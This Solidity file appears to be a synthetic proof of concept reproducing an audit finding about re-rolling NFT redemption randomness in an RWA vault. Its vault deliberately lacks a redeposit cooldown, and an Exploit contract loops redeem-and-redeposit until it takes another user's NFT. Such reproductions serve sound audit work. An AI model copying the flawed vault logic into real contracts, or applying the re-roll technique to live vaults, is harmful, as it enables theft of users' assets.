// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum Aurum — H-11 RWAVault redemption randomness (Pashov, 2025-05-06)
    SYNTHETIC, cheatcode-free reduction.
    redeemNFT() draws an NFT, and depositAsset() accepts that same id again.
    There is no cooldown. Bob rejects NFT 1, redeposits it, and the next VRF
    word selects Alice's NFT 2. The word list is fixed in the consumer.
    Bob does not choose it. He only chooses to roll again. */

contract RWA {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => address) public approved;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function approve(address spender, uint256 id) external {
        require(ownerOf[id] == msg.sender, "owner");
        approved[id] = spender;
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "from");
        require(msg.sender == from || approved[id] == msg.sender, "auth");
        ownerOf[id] = to;
        approved[id] = address(0);
    }
}

contract VrfConsumer {
    uint256 public word;
    uint256 public cursor;
    // Fixed responses. Index 0 then index 0 again would not change the pick,
    // so the second word is 1 and the third is 0. See Exploit.run.
    uint256[] public words;

    constructor() {
        words.push(1);
        words.push(0);
    }

    function requestRandomWords() external {}

    function fulfillRandomWords() external {
        word = words[cursor]; // S5 next VRF word, not chosen by the redeemer
        cursor += 1;
    }
}

contract RWAVault {
    RWA public rwa;
    VrfConsumer public vrf;
    uint256[] public ids;

    constructor(RWA r, VrfConsumer v) {
        rwa = r;
        vrf = v;
    }

    function depositAsset(uint256 id) external {
        rwa.transferFrom(msg.sender, address(this), id);
        ids.push(id); // @> VULN: a just-redeemed id is accepted. No cooldown is stored.
    }

    function getNextRandomNFT() external view returns (uint256 index, uint256 id) {
        index = vrf.word() % ids.length;
        id = ids[index];
    }

    function redeemNFT() external returns (uint256 id) {
        uint256 index = vrf.word() % ids.length;
        id = ids[index];
        ids[index] = ids[ids.length - 1];
        ids.pop();
        rwa.transferFrom(address(this), msg.sender, id); // S4
        vrf.requestRandomWords();
    }
}

contract Alice {
    function deposit(RWA rwa, RWAVault vault, uint256 id) external {
        rwa.approve(address(vault), id);
        vault.depositAsset(id); // S2
    }
}

contract Exploit {
    uint256 public constant FINDING = 66352;
    RWA public rwa;
    VrfConsumer public vrf;
    RWAVault public vault;
    Alice public alice;
    uint256 public spins;
    uint256 public firstId;

    constructor() {
        rwa = new RWA();
        vrf = new VrfConsumer();
        vault = new RWAVault(rwa, vrf);
        alice = new Alice();
    }

    function run() external {
        rwa.mint(address(this), 1);
        rwa.mint(address(alice), 2);
        rwa.approve(address(vault), 1);
        vault.depositAsset(1); // S1 Bob deposits NFT 1
        alice.deposit(rwa, vault, 2);
        uint256 id;
        (, id) = vault.getNextRandomNFT();
        while (id != 2) {
            uint256 got = vault.redeemNFT(); // S3
            if (spins == 0) firstId = got;
            rwa.approve(address(vault), got);
            vault.depositAsset(got);
            vrf.fulfillRandomWords();
            (, id) = vault.getNextRandomNFT();
            spins += 1;
            require(spins < 8, "spins");
        }
        uint256 taken = vault.redeemNFT(); // S6
        require(firstId == 1, "first draw");
        require(spins >= 1, "no retry");
        require(taken == 2, "wanted");
        require(rwa.ownerOf(2) == address(this), "bob holds 2"); // S7
        require(rwa.ownerOf(1) == address(vault), "rejected nft back");
    }
}
